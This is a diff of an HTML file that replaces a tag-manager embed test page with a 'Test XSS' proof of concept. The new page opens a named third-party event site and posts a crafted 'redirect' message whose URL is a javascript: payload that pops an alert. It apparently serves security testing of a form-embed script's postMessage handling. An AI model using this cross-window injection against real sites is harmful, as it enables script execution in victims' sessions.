@@ -1,19 +1,28 @@
 <!DOCTYPE html>
-<html lang="en">
-
+<html>
 <head>
-    <meta charset="utf-8">
-    <title>tag-manager.lan</title>
-
+  <meta charset="UTF-8">
+  <title>Test XSS</title>
 </head>
-
 <body>
-    <h1>Test tag manager</h1>
 
-    
-            <script src=https://pxl-gleb-kabizulov.qa.altcraft.com/form/js/embed_v1.js></script>
-<iframe src="https://pxl-gleb-kabizulov.qa.altcraft.com/form?form=9v4Xo1o5Y7nd3Xr1hkGSkxGpkojYm4s2hWm3UemVBh7KmJezKK2JNK1tU5dd1jqAoizwNDpLLNgUR&iframe=1" frameborder="0" name="ak-form-9v4Xo1o5Y7nd3Xr1hkGSkxGpkojYm4s2hWm3UemVBh7KmJezKK2JNK1tU5dd1jqAoizwNDpLLNgUR" class="ak-form" width="100%" sandbox="allow-same-origin allow-forms allow-scripts allow-popups allow-popups-to-escape-sandbox allow-top-navigation"></iframe>
-    
+<button onclick="attack()">Запустить тест</button>
+
+<script>
+function attack() {
+  const target = window.open("https://events.xxx.ru/javajam-2025");
+
+  setTimeout(() => {
+    target.postMessage(JSON.stringify({
+      source: "ak",
+      type: "redirect",
+      data: {
+        url: "javascript:alert('XSS TEST')"
+      }
+    }), "*");
+  }, 3000);
+}
+</script>
+
 </body>
-
 </html>
